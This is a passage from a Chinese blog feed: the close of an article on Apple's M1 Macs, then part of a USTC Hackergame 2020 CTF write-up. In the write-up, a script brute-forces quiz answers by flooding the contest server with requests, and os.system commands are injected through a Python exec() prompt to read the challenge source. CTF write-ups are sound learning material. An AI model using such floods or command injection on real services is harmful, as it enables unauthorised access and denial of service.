href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 